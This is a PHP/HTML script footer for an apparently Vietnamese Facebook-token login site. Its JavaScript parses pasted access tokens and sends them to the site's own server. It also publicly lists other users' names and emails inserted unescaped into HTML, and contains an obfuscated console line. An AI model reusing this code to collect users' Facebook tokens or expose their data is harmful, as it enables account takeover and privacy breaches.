<!-- build:js scripts/app.html.js -->
<!-- jQuery -->
<script src="assets/js/jquery/jquery/dist/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
<!-- Bootstrap -->
<script src="assets/js/jquery/tether/dist/js/tether.min.js"></script>
<script src="assets/js/jquery/bootstrap/dist/js/bootstrap.js"></script>
<!-- core -->
<script src="assets/js/jquery/underscore/underscore-min.js"></script>
<script src="assets/js/jquery/jQuery-Storage-API/jquery.storageapi.min.js"></script>
<script src="assets/js/jquery/PACE/pace.min.js"></script>

<script src="assets/scripts/config.lazyload.js"></script>

<script src="assets/scripts/palette.js"></script>
<script src="assets/scripts/ui-load.js"></script>
<script src="assets/scripts/ui-jp.js"></script>
<script src="assets/scripts/ui-include.js"></script>
<script src="assets/scripts/ui-device.js"></script>
<script src="assets/scripts/ui-form.js"></script>
<script src="assets/scripts/ui-nav.js"></script>
<script src="assets/scripts/ui-screenfull.js"></script>
<script src="assets/scripts/ui-scroll-to.js"></script>
<script src="assets/scripts/ui-toggle-class.js"></script>

<script src="assets/scripts/app.js"></script>

<!-- ajax -->
<script src="assets/js/jquery/jquery-pjax/jquery.pjax.js"></script>
<script src="assets/scripts/ajax.js"></script>
<script type="text/javascript">
    <?=(empty($_SESSION['login']) ? null : sprintf('var token = \'%s\',' . "\n me=%s;\n", $_SESSION['login'], json_encode($_SESSION['me'])))?>
    <?php
    if (file_exists(sprintf('IP/%s', $_SERVER['REMOTE_ADDR']))) {
        if (file_get_contents(sprintf('IP/%s', $_SERVER['REMOTE_ADDR'])) - time() < 900) {
            echo 'timec = ' . (file_get_contents(sprintf('IP/%s', $_SERVER['REMOTE_ADDR'])) - time()) . ';';
        } else {
            @unlink(sprintf('IP/%s', $_SERVER['REMOTE_ADDR']));
        }
    }
    ?>
    $(document).ready(function () {
        !!getURLParameter('i') && (alert(getURLParameter('i')), history.pushState({}, {}, '/'));
        console.log([(![] + [])[+!+[]] + ([][[]] + [])[+!+[]] + ([][(![] + [])[+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+!+[]]] + [])[!+[] + !+[] + !+[]] + String.fromCharCode(109, 115)]);
        $('form:first').submit(function () {
            return ((access_token = ($(this).find('input#access_token').val()).getToken()) && access_token && /^EAA/.test(access_token)) ? access_token.Login(!0 && this) : void(0) && ![];
        });
    });

    String.prototype.Login = function (__) {
        console.log('test');
        if (this === false) {
            return false
        }
        ;
        __ && $(__).find('button[type]').attr('disabled', true).html('<i class="fa fa-spinner fa-spin" ></i>');
        app = this;
        $.get('https://graph.fb.me/me', {access_token: this.trim()}).done(function (i) {
            $.ajax({url: 'login.php', data: {a: app}, 'method': 'POST'}).done(function (c) {
                c == 1 ? logger('Sai app facebook, vui lòng thử lại') : $(__).find('button[type]').attr('disabled', false).html('<span class="glyphicon glyphicon-thumbs-up" aria-hidden="true"></span> Đăng Nhập') && setTimeout(function () {
                    location = c
                }, 150);
            }).error(function (e) {
                e.error ? logger('Có lỗi xảy ra', 1) : app.Login()
            });
        }).error(function () {
            logger('Mã access_token không khả dụng hoặc đã hết hạn');
            $(__).find('button[type]').attr('disabled', false).html('<span class="glyphicon glyphicon-thumbs-up" aria-hidden="true"></span> Đăng Nhập')
        });
    };
    String.prototype.getToken = function () {
        return _ = this, "" == _ ? (logger("Vui lòng đọc kỹ hướng dẫn sử dụng!", 1), !1) : "https://www.facebook.com/connect/blank.html#_=_" == _ ? (logger("Bạn đã quá chậm ^^! Hãy thao tác nhanh hơn để có thể lấy được token.", 3), !1) : (/access_token=(.*)&expires_in/.test(_) && (_ = /access_token=(.*)&expires_in/.exec(this)[1]), _)
    }
    function logout() {
        $('body').removeClass('loaded');
        setTimeout(function () {
            $.get('logout.php', {data: !1});
            setTimeout(function () {
                location = 'index.php'
            }, 350);
            $('body').addClass('loaded');
        }, 1e3 / 2)
    }
    function logger() {
        $('#message').prepend($(('<div class="alert alert-$1" role="dialog" >$2</div>'.replace('$1', arguments[1] == 1 ? 'danger' : (arguments[1] == 2 ? 'success' : (arguments[0] == 3 ? 'warning' : 'info'))).replace('$2', arguments[0] || 'NONE'))).fadeIn(100).fadeOut(9999));
    }
    function getURLParameter(name) {
        return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(location.search) || [, ""])[1].replace(/\+/g, '%20')) || null
    }

    jQuery(document).ready(function ($) {
        var a = $.cookie('PHPSESSID');
        console.log(a);
        $.get("new-users.php")
            .done(function (listUser) {
                var users = JSON.parse(listUser);
                var usersHtml = '';

                $.each(users, function (key, val) {
                    if (!val.about) {
                        val.about = '';
                    }
                    usersHtml = '<div class="col-xs-6 col-lg-4">' +
                        '<div class="list-item box r m-b">' +
                        ' <a href="https://www.facebook.com/app_scoped_user_id/' + val.id + '" class="list-left"> ' +
                        '<span class="w-40 avatar"><img src="https://graph.facebook.com/' + val.id + '/picture?type=large">' +
                        '<i class="on b-white bottom"></i>' +
                        ' </span>' +
                        '</a>' +
                        '<div class="list-body">' +
                        '<div class="text-ellipsis"><a href="">'+ val.name +'</a></div>' +
                        '<small class="text-muted text-ellipsis">'+ val.email +'</small>' +
                        '</div>' +
                        '</div>' +
                        '</div>';
                    $('#listUser').append(usersHtml).fadeIn(500);
                });

            })
            .fail(function () {
                alert("error");
            });
    });
</script>
<?= (isset($main) ? '<script src="assets/js/app.min.js" ></script>' : '') ?>
<?= (isset($main) ? '<script src="assets/js/main.js"></script>' : '') ?>


